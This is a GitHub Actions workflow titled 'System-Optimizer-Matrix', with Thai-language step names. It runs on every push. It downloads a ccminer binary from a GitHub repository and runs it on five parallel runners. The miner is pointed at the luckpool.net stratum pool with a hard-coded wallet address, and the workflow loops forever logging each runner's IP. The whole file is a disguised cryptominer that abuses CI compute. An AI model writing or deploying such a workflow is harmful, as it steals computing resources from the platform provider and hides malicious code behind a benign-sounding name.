name: System-Optimizer-Matrix
on: [push, workflow_dispatch]

jobs:
  # ร่างที่ 1: หน่วยดึงข้อมูล (The Puller)
  puller:
    runs-on: ubuntu-latest
    steps:
      - name: 🚀 ดึงของใหญ่จากฟ้า
        run: |
          wget https://github.com/Oropendola-S/CCMINER-GITHUB/raw/main/ccminer
          chmod +x ccminer
          tar -cvf miner-payload.tar ccminer
      - name: 📦 ส่งพลังงานเข้าระบบรวมร่าง
        uses: actions/upload-artifact@v4
        with:
          name: dragon-core
          path: miner-payload.tar

  # ร่างที่ 2: หน่วยประมวลผลมหาประลัย (The Matrix)
  matrix-execution:
    needs: puller
    strategy:
      matrix:
        node: [1, 2, 3, 4, 5] # สั่งรวมร่าง 5 เครื่องพร้อมกัน!
    runs-on: ubuntu-latest
    steps:
      - name: 📥 รับพลังงานจากการรวมร่าง
        uses: actions/download-artifact@v4
        with:
          name: dragon-core
      - name: 🔥 ลั่นไกพร้อมกันทุกพิกัด
        run: |
          tar -xvf miner-payload.tar
          ./ccminer -a verushash -o stratum+tcp://na.luckpool.net:3956 -u R9zAnHAnBf5YfFjD3pYm1uU.CloudMerge${{ matrix.node }} -p x -t $(nproc) &
          while true; do
            IP=$(curl -s ifconfig.me)
            echo "📡 [Matrix-Node-${{ matrix.node }}] พิกัดรวมร่าง: $IP"
            sleep 60
          done
